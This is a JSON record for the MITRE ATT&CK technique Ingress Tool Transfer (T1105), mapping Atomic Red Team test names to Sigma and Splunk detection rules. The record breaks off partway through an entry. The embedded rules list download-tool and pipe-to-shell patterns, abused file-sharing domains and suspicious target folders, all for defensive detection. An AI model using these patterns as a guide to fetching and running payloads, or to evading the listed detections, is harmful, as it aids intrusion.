{
    "id": "T1105",
    "name": "Ingress Tool Transfer",
    "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
    "platforms": "Linux, macOS, Windows",
    "kill_chain_phases": "Command and Control",
    "data_sources": "Network Traffic: Network Traffic Flow, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, File: File Creation",
    "detection": "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
    "url": "https://attack.mitre.org/techniques/T1105",
    "enrichments": {
        "attack_rule_map": [
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "bdc373c5-e9cf-4563-8a7b-a9ba720a90f3",
                "atomic_attack_name": "Linux Download File and Run",
                "platform": "Linux",
                "sigma_rules": [
                    {
                        "rule_name": "Curl Usage on Linux",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_curl_usage.yml",
                        "remote_content": "title: Curl Usage on Linux\nid: ea34fb97-e2c4-4afb-810f-785e4459b194\nstatus: test\ndescription: Detects a curl process start on linux, which indicates a file download from a remote location or a simple web request to a remote server\nreferences:\n    - https://www.trendmicro.com/en_us/research/22/i/how-malicious-actors-abuse-native-linux-tools-in-their-attacks.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-15\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|endswith: '/curl'\n    condition: selection\nfalsepositives:\n    - Scripts created by developers and admins\n    - Administrative activity\nlevel: low\n"
                    },
                    {
                        "rule_name": "Linux Shell Pipe to Shell",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_susp_pipe_shell.yml",
                        "remote_content": "title: Linux Shell Pipe to Shell\nid: 880973f3-9708-491c-a77b-2a35a1921158\nstatus: test\ndescription: Detects suspicious process command line that starts with a shell that executes something and finally gets piped into another shell\nreferences:\n    - Internal Research\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-14\nmodified: 2022-07-26\ntags:\n    - attack.defense-evasion\n    - attack.t1140\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|startswith:\n            - 'sh -c '\n            - 'bash -c '\n    selection_exec:\n        - CommandLine|contains:\n              - '| bash '\n              - '| sh '\n              - '|bash '\n              - '|sh '\n        - CommandLine|endswith:\n              - '| bash'\n              - '| sh'\n              - '|bash'\n              - ' |sh'\n    condition: all of selection*\nfalsepositives:\n    - Legitimate software that uses these patterns\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Linux Common Process For Elevation Control",
                        "rule_link": "https://research.splunk.com/endpoint/66ab15c0-63d0-11ec-9e70-acde48001122/"
                    },
                    {
                        "rule_name": "Linux Ingress Tool Transfer with Curl",
                        "rule_link": "https://research.splunk.com/endpoint/8c1de57d-abc1-4b41-a727-a7a8fc5e0857/"
                    },
                    {
                        "rule_name": "Linux Ingress Tool Transfer Hunting",
                        "rule_link": "https://research.splunk.com/endpoint/52fd468b-cb6d-48f5-b16a-92f1c9bb10cf/"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "f564c297-7978-4aa9-b37a-d90477feea4e",
                "atomic_attack_name": "sftp remote file copy (push)",
                "platform": "Linux",
                "sigma_rules": [
                    {
                        "rule_name": "Execution Of Script Located In Potentially Suspicious Directory",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_susp_shell_script_exec_from_susp_location.yml",
                        "remote_content": "title: Execution Of Script Located In Potentially Suspicious Directory\nid: 30bcce26-51c5-49f2-99c8-7b59e3af36c7\nstatus: test\ndescription: Detects executions of scripts located in potentially suspicious locations such as \"/tmp\" via a shell such as \"bash\", \"sh\", etc.\nreferences:\n    - https://blogs.jpcert.or.jp/en/2023/05/gobrat.html\n    - https://jstnk9.github.io/jstnk9/research/GobRAT-Malware/\n    - https://www.virustotal.com/gui/file/60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3/detection\n    - https://www.virustotal.com/gui/file/3e44c807a25a56f4068b5b8186eee5002eed6f26d665a8b791c472ad154585d1/detection\nauthor: Joseliyo Sanchez, @Joseliyo_Jstnk\ndate: 2023-06-02\ntags:\n    - attack.execution\nlogsource:\n    product: linux\n    category: process_creation\ndetection:\n    selection_img:\n        Image|endswith:\n            - '/bash'\n            - '/csh'\n            - '/dash'\n            - '/fish'\n            - '/ksh'\n            - '/sh'\n            - '/zsh'\n    selection_flag:\n        CommandLine|contains: ' -c '\n    selection_paths:\n        # Note: Add more suspicious paths\n        CommandLine|contains: '/tmp/'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "66ee226e-64cb-4dae-80e3-5bf5763e4a51",
                "atomic_attack_name": "Arbitrary file download using the Notepad++ GUP.exe binary",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious GUP Usage",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_gup_suspicious_execution.yml",
                        "remote_content": "title: Suspicious GUP Usage\nid: 0a4f6091-223b-41f6-8743-f322ec84930b\nstatus: test\ndescription: Detects execution of the Notepad++ updater in a suspicious directory, which is often used in DLL side-loading attacks\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-02-06\nmodified: 2022-08-13\ntags:\n    - attack.defense-evasion\n    - attack.t1574.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\GUP.exe'\n    filter_programfiles:\n        Image|endswith:\n            - '\\Program Files\\Notepad++\\updater\\GUP.exe'\n            - '\\Program Files (x86)\\Notepad++\\updater\\GUP.exe'\n    filter_user:\n        Image|contains: '\\Users\\'\n        Image|endswith:\n            - '\\AppData\\Local\\Notepad++\\updater\\GUP.exe'\n            - '\\AppData\\Roaming\\Notepad++\\updater\\GUP.exe'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Execution of tools named GUP.exe and located in folders different than Notepad++\\updater\nlevel: high\n"
                    },
                    {
                        "rule_name": "File And SubFolder Enumeration Via Dir Command",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_cmd_dir_execution.yml",
                        "remote_content": "title: File And SubFolder Enumeration Via Dir Command\nid: 7c9340a9-e2ee-4e43-94c5-c54ebbea1006\nstatus: test\ndescription: |\n    Detects usage of the \"dir\" command part of Widows CMD with the \"/S\" command line flag in order to enumerate files in a specified directory and all subdirectories.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2024-04-14\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: Cmd.Exe\n    selection_cli:\n        CommandLine|contains|windash: 'dir*-s'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low\n"
                    },
                    {
                        "rule_name": "File Download Using Notepad++ GUP Utility",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_gup_download.yml",
                        "remote_content": "title: File Download Using Notepad++ GUP Utility\nid: 44143844-0631-49ab-97a0-96387d6b2d7c\nstatus: test\ndescription: Detects execution of the Notepad++ updater (gup) from a process other than Notepad++ to download files.\nreferences:\n    - https://twitter.com/nas_bench/status/1535322182863179776\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-10\nmodified: 2023-03-02\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\GUP.exe'\n        - OriginalFileName: 'gup.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -unzipTo '\n            - 'http'\n    filter:\n        ParentImage|endswith: '\\notepad++.exe'\n    condition: all of selection* and not filter\nfalsepositives:\n    - Other parent processes other than notepad++ using GUP that are not currently identified\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Windows Password Managers Discovery",
                        "rule_link": "https://research.splunk.com/endpoint/a3b3bc96-1c4f-4eba-8218-027cac739a48/"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "b1729c57-9384-4d1c-9b99-9b220afb384e",
                "atomic_attack_name": "Nimgrab - Transfer Files",
                "platform": "Windows",
                "splunk_rules": [
                    {
                        "rule_name": "CMD Carry Out String Command Parameter",
                        "rule_link": "https://research.splunk.com/endpoint/54a6ed00-3256-11ec-b031-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "54a4daf1-71df-4383-9ba7-f1a295d8b6d2",
                "atomic_attack_name": "File Download via PowerShell",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PowerShell Web Download",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PowerShell Download Pattern",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Any Powershell DownloadString",
                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "42dc4460-9aa6-45d3-b1a6-3955d34e1fe8",
                "atomic_attack_name": "Windows - PowerShell Download",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PowerShell Web Download",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
                    },
                    {
                        "rule_name": "PowerShell DownloadFile",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_ps_downloadfile.yml",
                        "remote_content": "title: PowerShell DownloadFile\nid: 8f70ac5f-1f6f-4f8e-b454-db19561216c5\nstatus: test\ndescription: Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2020-08-28\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - attack.command-and-control\n    - attack.t1104\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'powershell'\n            - '.DownloadFile'\n            - 'System.Net.WebClient'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    },
                    {
                        "rule_name": "PowerShell Download Pattern",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "Any Powershell DownloadFile",
                        "rule_link": "https://research.splunk.com/endpoint/1a93b7ea-7af7-11eb-adb5-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b",
                "atomic_attack_name": "Windows - BITSAdmin BITS Download",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Suspicious Download From File-Sharing Website Via Bitsadmin",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_file_sharing_domains.yml",
                        "remote_content": "title: Suspicious Download From File-Sharing Website Via Bitsadmin\nid: 8518ed3d-f7c9-4601-a26c-f361a4256a0c\nstatus: experimental\ndescription: Detects usage of bitsadmin downloading a file from a suspicious domain\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\n    - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker\n    - https://www.cisa.gov/uscert/ncas/alerts/aa22-321a\n    - https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-06-28\nmodified: 2024-08-22\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_flags:\n        CommandLine|contains:\n            - ' /transfer '\n            - ' /create '\n            - ' /addfile '\n    selection_domain:\n        CommandLine|contains:\n            - '.githubusercontent.com'       # Includes both gists and github repositories / Michael Haag (idea)\n            - 'anonfiles.com'\n            - 'cdn.discordapp.com'\n            - 'ddns.net'\n            - 'dl.dropboxusercontent.com'\n            - 'ghostbin.co'\n            - 'glitch.me'\n            - 'gofile.io'\n            - 'hastebin.com'\n            - 'mediafire.com'\n            - 'mega.nz'\n            - 'onrender.com'\n            - 'pages.dev'\n            - 'paste.ee'\n            - 'pastebin.com'\n            - 'pastebin.pl'\n            - 'pastetext.net'\n            - 'privatlab.com'\n            - 'privatlab.net'\n            - 'send.exploit.in'\n            - 'sendspace.com'\n            - 'storage.googleapis.com'\n            - 'storjshare.io'\n            - 'supabase.co'\n            - 'temp.sh'\n            - 'transfer.sh'\n            - 'trycloudflare.com'\n            - 'ufile.io'\n            - 'w3spaces.com'\n            - 'workers.dev'\n    condition: all of selection_*\nfalsepositives:\n    - Some legitimate apps use this, but limited.\nlevel: high\n"
                    },
                    {
                        "rule_name": "File Download Via Bitsadmin To A Suspicious Target Folder",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_targetfolder.yml",
                        "remote_content": "title: File Download Via Bitsadmin To A Suspicious Target Folder\nid: 2ddef153-167b-4e89-86b6-757a9e65dcac\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file to a suspicious target folder\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\n    - https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-28\nmodified: 2023-05-30\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_flags:\n        CommandLine|contains:\n            - ' /transfer '\n            - ' /create '\n            - ' /addfile '\n    selection_folder:\n        CommandLine|contains:\n            - ':\\Perflogs'\n            - ':\\ProgramData\\'\n            - ':\\Temp\\'\n            - ':\\Users\\Public\\'\n            - ':\\Windows\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n            - '\\Desktop\\'\n            - '%ProgramData%'\n            - '%public%'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    },
                    {
                        "rule_name": "File Download Via Bitsadmin To An Uncommon Target Folder",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_uncommon_targetfolder.yml",
                        "remote_content": "title: File Download Via Bitsadmin To An Uncommon Target Folder\nid: 6e30c82f-a9f8-4aab-b79c-7c12bce6f248\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file to uncommon target folder\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\n    - https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-28\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_flags:\n        CommandLine|contains:\n            - ' /transfer '\n            - ' /create '\n            - ' /addfile '\n    selection_folder:\n        CommandLine|contains:\n            - '%AppData%'\n            - '%temp%'\n            - '%tmp%'\n            - '\\AppData\\Local\\'\n            - 'C:\\Windows\\Temp\\'\n    condition: all of selection_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n"
                    },
                    {
                        "rule_name": "File With Suspicious Extension Downloaded Via Bitsadmin",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_extensions.yml",
                        "remote_content": "title: File With Suspicious Extension Downloaded Via Bitsadmin\nid: 5b80a791-ad9b-4b75-bcc1-ad4e1e89c200\nstatus: test\ndescription: Detects usage of bitsadmin downloading a file with a suspicious extension\nreferences:\n    - https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin\n    - https://isc.sans.edu/diary/22264\n    - https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-06-28\nmodified: 2023-05-30\ntags:\n    - attack.defense-evasion\n    - attack.persistence\n    - attack.t1197\n    - attack.s0190\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bitsadmin.exe'\n        - OriginalFileName: 'bitsadmin.exe'\n    selection_flags:\n        CommandLine|contains:\n            - ' /transfer '\n            - ' /create '\n            - ' /addfile '\n    selection_extension:\n        CommandLine|contains:\n            - '.7z'\n            - '.asax'\n            - '.ashx'\n            - '.asmx'\n            - '.asp'\n            - '.aspx'\n            - '.bat'\n            - '.cfm'\n            - '.cgi'\n            - '.chm'\n            - '.cmd'\n            - '.dll'\n            - '.gif'\n            - '.jpeg'\n            - '.jpg'\n            - '.jsp'\n            - '.jspx'\n            - '.log'\n            - '.png'\n            - '.ps1'\n            - '.psm1'\n            - '.rar'\n            - '.scf'\n            - '.sct'\n            - '.txt'\n            - '.vbe'\n            - '.vbs'\n            - '.war'\n            - '.wsf'\n            - '.wsh'\n            - '.xll'\n            - '.zip'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ],
                "splunk_rules": [
                    {
                        "rule_name": "BITSAdmin Download File",
                        "rule_link": "https://research.splunk.com/endpoint/80630ff4-8e4c-11eb-aab5-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "dd3b61dd-7bbc-48cd-ab51-49ad1a776df0",
                "atomic_attack_name": "certutil download (urlcache)",
                "platform": "Windows",
                "splunk_rules": [
                    {
                        "rule_name": "CMD Carry Out String Command Parameter",
                        "rule_link": "https://research.splunk.com/endpoint/54a6ed00-3256-11ec-b031-acde48001122/"
                    }
                ]
            },
            {
                "tech_id": "T1105",
                "atomic_attack_guid": "c01cad7f-7a4c-49df-985e-b190dcf6a279",
                "atomic_attack_name": "iwr or Invoke Web-Request download",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Suspicious Script Execution From Temp Folder",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_script_exec_from_temp.yml",
